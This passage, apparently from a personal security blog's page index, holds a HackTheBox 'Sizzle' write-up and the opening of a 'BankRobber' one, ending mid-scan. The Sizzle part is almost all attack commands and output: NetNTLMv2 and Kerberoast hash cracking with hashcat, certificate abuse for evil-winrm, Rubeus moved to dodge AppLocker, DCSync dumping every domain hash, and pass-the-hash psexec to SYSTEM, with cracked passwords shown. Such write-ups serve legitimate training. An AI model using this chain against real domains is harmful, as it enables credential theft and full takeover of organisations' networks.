amanda::HTB:b675715c5499593c:FFD2BBFCC28DC7D3CEFF1F0841376996:010100000000000080AC78D583F8D90170E74450E59B13B400000000020008004A004D004E00360001001E00570049004E002D0050005100380053004200320033005000490052004A0004003400570049004E002D0050005100380053004200320033005000490052004A002E004A004D004E0036002E004C004F00430041004C00030014004A004D004E0036002E004C004F00430041004C00050014004A004D004E0036002E004C004F00430041004C000700080080AC78D583F8D90106000400020000000800300030000000000000000100000000200000AADDC6CF9EC13F9A82B5C282A14AA8FBCE7DDBBD58FF57D644C90A4B93B67EBA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000 Let\u0026rsquo;s crack it └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ... AMANDA::HTB:b675715c5499593c:ffd2bbfcc28dc7d3ceff1f0841376996:010100000000000080ac78d583f8d90170e74450e59b13b400000000020008004a004d004e00360001001e00570049004e002d0050005100380053004200320033005000490052004a0004003400570049004e002d0050005100380053004200320033005000490052004a002e004a004d004e0036002e004c004f00430041004c00030014004a004d004e0036002e004c004f00430041004c00050014004a004d004e0036002e004c004f00430041004c000700080080ac78d583f8d90106000400020000000800300030000000000000000100000000200000aaddc6cf9ec13f9a82b5c282a14aa8fbce7ddbbd58ff57d644c90a4b93b67eba0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:Ashare1972 ... No winrm Let\u0026rsquo;s check smb └─$ crackmapexec smb 10.10.10.103 -u amanda -p \u0026#39;Ashare1972\u0026#39; --shares SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\amanda:Ashare1972 SMB 10.10.10.103 445 SIZZLE [+] Enumerated shares SMB 10.10.10.103 445 SIZZLE Share Permissions Remark SMB 10.10.10.103 445 SIZZLE ----- ----------- ------ SMB 10.10.10.103 445 SIZZLE ADMIN$ Remote Admin SMB 10.10.10.103 445 SIZZLE C$ Default share SMB 10.10.10.103 445 SIZZLE CertEnroll READ Active Directory Certificate Services share SMB 10.10.10.103 445 SIZZLE Department Shares READ SMB 10.10.10.103 445 SIZZLE IPC$ READ Remote IPC SMB 10.10.10.103 445 SIZZLE NETLOGON READ Logon server share SMB 10.10.10.103 445 SIZZLE Operations SMB 10.10.10.103 445 SIZZLE SYSVOL READ Logon server share Now we have access to CertEnroll I\u0026rsquo;ll download the files └─$ smbclient //10.10.10.103/CertEnroll -U \u0026#39;amanda%Ashare1972\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Oct 7 11:58:35 2023 .. D 0 Sat Oct 7 11:58:35 2023 HTB-SIZZLE-CA+.crl A 721 Sat Oct 7 11:58:35 2023 HTB-SIZZLE-CA.crl A 909 Sat Oct 7 11:58:35 2023 nsrev_HTB-SIZZLE-CA.asp A 322 Mon Jul 2 21:36:05 2018 sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt A 871 Mon Jul 2 21:36:03 2018 7779839 blocks of size 4096. 3151878 blocks available smb: \\\u0026gt; prompt smb: \\\u0026gt; mget * getting file \\HTB-SIZZLE-CA+.crl of size 721 as HTB-SIZZLE-CA+.crl (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec) getting file \\HTB-SIZZLE-CA.crl of size 909 as HTB-SIZZLE-CA.crl (1.6 KiloBytes/sec) (average 1.2 KiloBytes/sec) getting file \\nsrev_HTB-SIZZLE-CA.asp of size 322 as nsrev_HTB-SIZZLE-CA.asp (0.7 KiloBytes/sec) (average 1.0 KiloBytes/sec) getting file \\sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt of size 871 as sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec) smb: \\\u0026gt; exot exot: command not found smb: \\\u0026gt; exit Let\u0026rsquo;s also gather domain info with bloodhound └─$ bloodhound-python -u amanda -p \u0026#39;Ashare1972\u0026#39; -d htb.local -dc sizzle.HTB.LOCAL -ns 10.10.10.103 -c all --zip INFO: Found AD domain: htb.local INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno 113] No route to host INFO: Connecting to LDAP server: sizzle.HTB.LOCAL INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: sizzle.HTB.LOCAL INFO: Found 8 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: sizzle.HTB.LOCAL INFO: Done in 00M 30S INFO: Compressing output into 20231007121654_bloodhound.zip If we check amanda user privileges, it shows that she\u0026rsquo;s in Remote Management Users group Since we failed winrm authentification, maybe it requires certificate for login We saw CertEnroll directory and /certenroll and /certsrv which are part of ADCS We can visit /certsrv and use amanda creds to access web enrollment feature I tried to use User certificate template, but it failed We could create a csr and submit it via advanced certificate request feature https://10.10.10.103/certsrv/certrqxt.asp └─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr ..+.....+.+...............+..............+.+...........+.+...+..+.......+..+...+...+...+....+..+....+..+.......+..+..........+...........+.......+...+..+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+...+......+.+......+.....+...+....+..+.+........+.+...+.................+.+............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+......+..+.............+......+........+.......+.........+..+.........+...+......+..........+..+...+....+...+..+......+......+.+.................+.+..............+...+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ .......+.....+....+..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+...+.........+......+...................+.........+.....+......+....+.........+..+.+.....+.......+...+........+....+...+...+..+.........+...+...+.......+...+...+..+...+....+.....+.+.....+......+...+.+.........+...........+.+......+............+.....+.....................+.......+..+...+.........+..........+......+...+.....+.+......+..+..........+........+......................+........+...+.......+............+.....+.+.....+.+........+......+....+...+.....+...+....+........+...+....+......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]: State or Province Name (full name) [Some-State]: Locality Name (eg, city) []: Organization Name (eg, company) [Internet Widgits Pty Ltd]: Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []: Email Address []: Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: └─$ ls amanda.* amanda.csr amanda.key └─$ cat amanda.csr -----BEGIN CERTIFICATE REQUEST----- MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN AQEBBQADggEPADCCAQoCggEBALYZAo96tF+HCNgI4MjYYwI4SGxtWeQGUET4jz4s akgn3Ds9bdIOJWol4Bbc6nSbX8KzOT5pxBJonzkF62M933dJNXJslNZtB0FUbuhC AXiG2T1JtKw6Rc6qXaCspwcbiHxd6dsBOT+dj6TLuXoULExjJFAEQiii16qE1aeE 2LhrP6are383W6//VQzqGIBrHDHzwHYD18vgXk1QGaJm6dQn2g1VWu3cZ3wSBBjC vJApK3iz51thfizzgQwQKr0oc6AGfYpzHG8qUrphG5DqXXHel3+WJmtQ3+4bq3Eh excOvG7hTGq0tRvyO/bK2hWNChyOBypKlubq1Gdk2BclRJcCAwEAAaAAMA0GCSqG SIb3DQEBCwUAA4IBAQBSWmGAIrVDMgU4S/mZnDK0DU06/2vMz4NbhQgBlmRZ5VaK LOmdhILontT+PibX5AtSXRhN4bGRp1ZSH9Fs9Wf3QToT6y0QJEVDlHEK3eq4CF5N /7Kq7i8DyhI+DzPAXZdRVCev9Hy15TI3FnOA+qsCUZx6XctkCi5vVwAbt5N/T78e cciP1QuNiWPLKUhx/HdxT3tx4h4YQAjVI7Foe4u1wWpfQRc8+VTdPq3LkybiIq+X h7R17BeDE/4Z2pnk4OGPgeM+Hba9CV5XEWuPhf2ueAPg9rRLBoQBHHyw7ikKbCv2 BXNcocC9YZ+YuzxFlndC5TFn3dkM8+8W48t6lAKF -----END CERTIFICATE REQUEST----- Now submit the request and download it Let\u0026rsquo;s connect using evil-winrm └─$ evil-winrm -S -c amanda.crt -k amanda.key -i 10.10.10.103 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\amanda\\Documents\u0026gt; User We have another user mrlky who has access to box If we check bloodhound, mrlky is also in Remote Management User and has SPN set *Evil-WinRM* PS C:\\Users\u0026gt;ls Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/2/2018 4:29 PM .NET v4.5 d----- 7/2/2018 4:29 PM .NET v4.5 Classic d----- 8/19/2018 3:04 PM administrator d----- 9/30/2018 5:05 PM amanda d----- 7/2/2018 12:39 PM mrlky d----- 7/11/2018 5:59 PM mrlky.HTB d-r--- 11/20/2016 8:24 PM Public d----- 7/3/2018 10:32 PM WSEnrollmentPolicyServer d----- 7/3/2018 10:49 PM WSEnrollmentServer If we check netstat, port 88 is open Maybe there\u0026rsquo;s a firewall that blocks That\u0026rsquo;s why we didn\u0026rsquo;t have results using impacket-GetUserSPNs *Evil-WinRM* PS C:\\Users\u0026gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:21 0.0.0.0:0 LISTENING 2116 TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 824 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 824 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5986 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2056 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 460 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 304 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49670 0.0.0.0:0 LISTENING 1152 TCP 0.0.0.0:49677 0.0.0.0:0 LISTENING 1924 TCP 0.0.0.0:49689 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49690 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49693 0.0.0.0:0 LISTENING 1188 TCP 0.0.0.0:49696 0.0.0.0:0 LISTENING 588 TCP 0.0.0.0:49701 0.0.0.0:0 LISTENING 2076 TCP 0.0.0.0:49710 0.0.0.0:0 LISTENING 2096 TCP 0.0.0.0:49716 0.0.0.0:0 LISTENING 2104 TCP 10.10.10.103:53 0.0.0.0:0 LISTENING 2096 TCP 10.10.10.103:139 0.0.0.0:0 LISTENING 4 TCP 10.10.10.103:5986 10.10.16.9:36460 ESTABLISHED 4 TCP 127.0.0.1:53 0.0.0.0:0 LISTENING 2096 We can upload Rubeus and try to perform kerberoast But I receive an error when trying to run it Could be Applocker Let\u0026rsquo;s place it C:\\windows\\temp https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md *Evil-WinRM* PS C:\\Users\\amanda\u0026gt; .\\rb.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972 Program \u0026#39;rb.exe\u0026#39; failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1 + .\\rb.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare19 ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~. At line:1 char:1 + .\\rb.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare19 ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed And we successfully get the hash We could upload chisel configure port forwarding to do the same thing *Evil-WinRM* PS C:\\windows\\temp\u0026gt; c:\\windows\\temp\\rb.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target Domain : HTB.LOCAL [*] Searching path \u0026#39;LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL\u0026#39; for \u0026#39;(\u0026amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\u0026#39; [*] Total kerberoastable users : 1 [*] SamAccountName : mrlky [*] DistinguishedName : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL [*] ServicePrincipalName : http/sizzle [*] PwdLastSet : 7/10/2018 2:08:09 PM [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$78D62920398D6583B8F4E22D761D 2170$604D4ECE97E9AC1730811278F5309A2373B5E92DA70BC99B2FDD46131FAF946249F3F519135 3D872662DE4599089BCB5D230683CE1B3F2F697D652FF038E045D622F3E38CB1EC8D15B5911DC2DD BE2F938FE70B52E8F13F144CF7714EA04460764A560FD99CE60140989F1D0974E36437B5EA6D0173 F718195F834F263A6E862AD8B38A67282B59912E475602D79D5096A1D252E8FA2062559DF6DEBEF9 8D4C4894DCAB40BA0DEB7A7666678D024A251CBF3BD75580B2A631C67F24897BDBEC9BEC92DDE9E3 45440DE9BF3EFC08CB5CCD341A032B86211408B40685BC1CFE32EC80110442AC948D9D6985141581 3C62B55549AAD50ED670423EA4BB6D8D870E88824E9254D5C0F854AC63C798399D70167607762AF0 93AB6934099ADA65D524475ED1A061C46DDA0C034DE69053CE994763F785E2CF998415B44E096D6E 3571CD052EC14393FD764D358CAF1B0FB2DB4E02055F98DAB1C3E1B479FFDB056B9EB51FFB031CAB DE6B9F57065D2234546902F48872EC48D55165FC2E41A8F683158F0486E1BA6915E6EBA5DAD77C73 F97CFAFF87E5BFE5BED5618A8BECD1C15E978634FA02F4F1F3C96B43F797000F0D2DAC48D7E3CFC8 FAC3CFBE21246FB27C9328AC31037896D08300A6D28DE65F46620CE5DAFEC93379E5B71EBF39A8EA 7EE55C91418DE2201317F0D83B3BA7B775D02191B448DF2F1FFA73EA611A94E4E07563E2CA44F46D 52BCCD3ABDCBC65D265CCFAA6188E6902C5FB8F2D336678C96B29128E89047386AC77D3A979B0413 31858C3BF57847F4008EA76EF6251E12B6A039C6193CC6100FB635EEB10DD85E48E06784EE99D273 C1226A41A23D35F2A3BC78AC20687592033DA8343654AC5AC88A131765198B00FF7CCBEF27416AC5 DE5CA321634B1F343BA1ECC48F52A018E4FD8BFE7E91C0BF9329A0193EAB4CF479802AF3585D8FED 8740761351B3AFE3BC1DDAD3B78E4C15338B78ABAB0BD79DE5FB3C99A13774D1F8B97726EBB095C1 FAB1BFB1C5CD69D30E2C8B0BD74674AC322B700BC73D7227D7E0067797D487B82F68CD27310D9431 22E213101A88FCD6BA4AE69A134C3AA10715A97F6B0AB44E391061472A7712F7AAE05D2EAAD42D8A C3D4CB908F6D454FAB380C2509992B9897BF380BF3383C76D09D5200FF26F672D163400FC58286F7 81EEB425C0400B11A85B28B0E0630A0C24A567CABDDA9363A4A00C7474D4F0FBB68EA9138D98954F E76C284322D0CAEF5E946D8731AA3EDEDD242ADF01F0CAD9AF352510EE7564161DD78C18742DF365 5FA89964D8385925210441B31CC64D36D2E52DDF0B1BC8937DA77157821B9447271D0D25591CDAB6 6DD9193EE2F31E18F Let\u0026rsquo;s crack it └─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU ... $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$78d62920398d6583b8f4e22d761d2170$604d4ece97e9ac1730811278f5309a2373b5e92da70bc99b2fdd46131faf946249f3f5191353d872662de4599089bcb5d230683ce1b3f2f697d652ff038e045d622f3e38cb1ec8d15b5911dc2ddbe2f938fe70b52e8f13f144cf7714ea04460764a560fd99ce60140989f1d0974e36437b5ea6d0173f718195f834f263a6e862ad8b38a67282b59912e475602d79d5096a1d252e8fa2062559df6debef98d4c4894dcab40ba0deb7a7666678d024a251cbf3bd75580b2a631c67f24897bdbec9bec92dde9e345440de9bf3efc08cb5ccd341a032b86211408b40685bc1cfe32ec80110442ac948d9d69851415813c62b55549aad50ed670423ea4bb6d8d870e88824e9254d5c0f854ac63c798399d70167607762af093ab6934099ada65d524475ed1a061c46dda0c034de69053ce994763f785e2cf998415b44e096d6e3571cd052ec14393fd764d358caf1b0fb2db4e02055f98dab1c3e1b479ffdb056b9eb51ffb031cabde6b9f57065d2234546902f48872ec48d55165fc2e41a8f683158f0486e1ba6915e6eba5dad77c73f97cfaff87e5bfe5bed5618a8becd1c15e978634fa02f4f1f3c96b43f797000f0d2dac48d7e3cfc8fac3cfbe21246fb27c9328ac31037896d08300a6d28de65f46620ce5dafec93379e5b71ebf39a8ea7ee55c91418de2201317f0d83b3ba7b775d02191b448df2f1ffa73ea611a94e4e07563e2ca44f46d52bccd3abdcbc65d265ccfaa6188e6902c5fb8f2d336678c96b29128e89047386ac77d3a979b041331858c3bf57847f4008ea76ef6251e12b6a039c6193cc6100fb635eeb10dd85e48e06784ee99d273c1226a41a23d35f2a3bc78ac20687592033da8343654ac5ac88a131765198b00ff7ccbef27416ac5de5ca321634b1f343ba1ecc48f52a018e4fd8bfe7e91c0bf9329a0193eab4cf479802af3585d8fed8740761351b3afe3bc1ddad3b78e4c15338b78abab0bd79de5fb3c99a13774d1f8b97726ebb095c1fab1bfb1c5cd69d30e2c8b0bd74674ac322b700bc73d7227d7e0067797d487b82f68cd27310d943122e213101a88fcd6ba4ae69a134c3aa10715a97f6b0ab44e391061472a7712f7aae05d2eaad42d8ac3d4cb908f6d454fab380c2509992b9897bf380bf3383c76d09d5200ff26f672d163400fc58286f781eeb425c0400b11a85b28b0e0630a0c24a567cabdda9363a4a00c7474d4f0fbb68ea9138d98954fe76c284322d0caef5e946d8731aa3ededd242adf01f0cad9af352510ee7564161dd78c18742df3655fa89964d8385925210441b31cc64d36d2e52ddf0b1bc8937da77157821b9447271d0d25591cdab66dd9193ee2f31e18f:Football#7 ... We have to perform the same steps to request the certificate for mrlky Generate cert via openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr and submit it to https://10.10.10.103/certsrv/certfnsh.asp by using mrlky:Football#7 creds └─$ evil-winrm -S -c mrlky.crt -k mrlky.key -i 10.10.10.103 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\mrlky.HTB\\Documents\u0026gt; Root If we check bloodhound, mrlky has dcsync permissions Let\u0026rsquo;s dump using impacket-secretsdump └─$ impacket-secretsdump htb.local/mrlky:\u0026#39;Football#7\u0026#39;@10.10.10.103 Impacket v0.11.0 - Copyright 2023 Fortra [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3::: mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef::: sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de::: SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:08d20a47c6938996a375f6fb51ddceb5::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3 Administrator:des-cbc-md5:ad7afb706715e964 krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699 krbtgt:des-cbc-md5:866db35eb9ec5173 amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061 amanda:des-cbc-md5:70ba677a4c1a2adf mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155 mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0 mrlky:des-cbc-md5:02f1a4da0432f7f7 sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955 sizzler:des-cbc-md5:5d51d30e68d092d9 SIZZLE$:aes256-cts-hmac-sha1-96:e4cc1e3b5b630be6ea08381dcc83a4e9484f495238c7ceb9d2c6f64b66bc2384 SIZZLE$:aes128-cts-hmac-sha1-96:3ef35b2f32ff548020a92f74626629e6 SIZZLE$:des-cbc-md5:4631c79d070b1329 [*] Cleaning up... Let\u0026rsquo;s connect as Administrator └─$ impacket-psexec Administrator@10.10.10.103 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267\u0026#39; Impacket v0.11.0 - Copyright 2023 Fortra [*] Requesting shares on 10.10.10.103..... [*] Found writable share ADMIN$ [*] Uploading file HZNuLkEs.exe [*] Opening SVCManager on 10.10.10.103..... [*] Creating service YBED on 10.10.10.103..... [*] Starting service YBED..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; There are 2 unintended paths ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/sizzle.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sizzle/","summary":"Sizzle Enumeration nmap └─$ nmap -Pn -p- 10.10.10.103 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:19 BST Nmap scan report for 10.10.10.103 (10.10.10.103) Host is up (0.11s latency). Not shown: 65506 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 5986/tcp open wsmans 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49668/tcp open unknown 49677/tcp open unknown 49688/tcp open unknown 49689/tcp open unknown 49691/tcp open unknown 49694/tcp open unknown 49699/tcp open unknown 49708/tcp open unknown 49714/tcp open unknown └─$ nmap -Pn -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sC -sV 10.","tags":["HTB","smbclient","smb","ftp","responder","scf","net-ntlmv2","hashcat","ldap","certsrv","certificate","openssl","winrm","constrained-language-mode","psbypassclm","installutil","msbuild","kerberoast","tunnel","rubeus","chisel","bloodhound","dcsync","secretsdump","crackmapexec","psexec","ntlm-http","certificate-authority","client-certificate","adcs"],"title":"[HTB] Machine: Sizzle"},{"categories":null,"contents":"BankRobber Enumeration nmap └─$ nmap -Pn -p- 10.10.10.154 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:23 BST Nmap scan report for 10.10.10.154 (10.10.10.154) Host is up (0.11s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 28.12 seconds └─$ nmap -Pn -p80,443,445,3306 -sC -sV 10.10.10.154 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:27 BST Nmap scan report for 10.10.10.154 (10.10.10.154) Host is up (0.13s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 |_http-title: E-coin 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-09-30T20:27:51 |_ start_date: 2023-09-30T20:21:05 | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -3s, deviation: 0s, median: -4s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.68 seconds mysql └─$ mysql -h 10.10.10.154 --port 3306 ERROR 1130 (HY000): Host \u0026#39;10.10.16.9\u0026#39; is not allowed to connect to this MariaDB server smb └─$ smbmap -H 10.10.10.154 [!] Authentication error on 10.10.10.154 Web Server gobuster └─$ gobuster dir -u http://10.10.10.154/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.154/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/10/01 19:41:43 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 8245] /img (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.154/img/] /login.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /register.php (Status: 200) [Size: 0] /user (Status: 301) [Size: 335] [--\u0026gt; 